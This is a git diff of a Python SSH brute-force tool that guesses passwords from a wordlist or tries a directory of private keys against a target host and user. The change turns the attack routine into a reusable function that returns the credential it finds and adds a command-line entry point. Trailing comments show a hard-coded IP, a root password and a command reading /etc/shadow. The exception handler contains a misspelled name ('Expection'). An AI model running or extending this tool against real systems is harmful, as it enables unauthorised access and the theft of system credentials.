@@ -2,9 +2,6 @@
 # coding=utf-8
 __author__="riverchu"
 
-import sys
-sys.path.append('../')
-
 import os
 import optparse
 import time
@@ -33,6 +30,7 @@ def connect_with_passwd(host,user,passwd,release):
         s.login(host,user,passwd)
         PASSWD=passwd
         Found=True
+        s.logout()
     except Exception as e:
         #出现错误 s置为空
         if 'read_nonblocking' in str(e):
@@ -43,6 +41,7 @@ def connect_with_passwd(host,user,passwd,release):
             time.sleep(1)
             connect_with_passwd(host,user,passwd,False)
     finally:
+        s.close()
         if release:CONNECTION_LOCK.release()
 
 def connect_with_key(user, host,keyfile,release):
@@ -114,7 +113,38 @@ def ssh_pass(host,user,passwdFile):
         for t in threads:
             t.join()
 
-def bruteSSH():
+def bruteSSH(host,user,*,passKeyDir=None,passwdFile=None):
+    if passKeyDir==None and passwdFile==None:
+        print('[-] Wrong parameters.')
+
+    global Found,Fails
+    global PASSWD,KEYFILE
+    ret = {'host':host,'user':user,'type':None,'key':None}
+    if passKeyDir:
+        ssh_key(host,user,passKeyDir)
+        if Found:
+            print('[+] Keyfile Found: '+KEYFILE)
+        elif Fails>5:
+            print('[-] Exiting: Too Many Connections Closed By Remote Host.')
+            print('[-] Adjust number of simultaneous threads.')
+        else:
+            print('[-] No Key Found.')
+        ret['type']='publicKey'
+        ret['key']=KEYFILE
+        return ret
+    elif passwdFile:
+        ssh_pass(host,user,passwdFile)
+        if Found:
+            print('[+] Password Found: '+PASSWD)
+        elif Fails>5:
+            print('[-] Too Many Socket Timeouts.')
+        else:
+            print('[-] No Password Found.')
+        ret['type']='password'
+        ret['key']=PASSWD
+        return ret
+
+def main():
     parser = optparse.OptionParser('usage %prog '+'-H <target host> -u <user> -F <password list>')
     parser.add_option('-H',dest = 'tgtHost',type='string',help='specify target host')
     parser.add_option('-F',dest = 'passwdFile',type='string',help='specify password file')
@@ -130,29 +160,14 @@ def bruteSSH():
         print(parser.usage)
         exit(0)
 
-    global Found
-    global Fails
-    global PASSWD
-    global KEYFILE
-    if passKeyDir:
-        ssh_key(host,user,passKeyDir)
-        if Found:
-            print('[+] Keyfile Found: '+KEYFILE)
-        elif Fails>5:
-            print('[-] Exiting: Too Many Connections Closed By Remote Host.')
-            print('[-] Adjust number of simultaneous threads.')
-        else:
-            print('[-] No Key Found.')
-    elif passwdFile:
-        ssh_pass(host,user,passwdFile)
-        if Found:
-            print('[+] Password Found: '+PASSWD)
-        elif Fails>5:
-            print('[-] Too Many Socket Timeouts.')
-        else:
-            print('[-] No Password Found.')
+    try:
+        bruteSSH(host,user,passwdFile=passwdFile,passKeyDir=passKeyDir)
+    except KeyboardInterrupt:
+        pass
+    except Expection as e:
+        print('[-]',e)
 
 if __name__=="__main__":
-    bruteSSH()
+    main()
 #s=connect('10.108.36.71','root','indigosrpi')
 #send_command(s,'cat /etc/shadow | grep root')
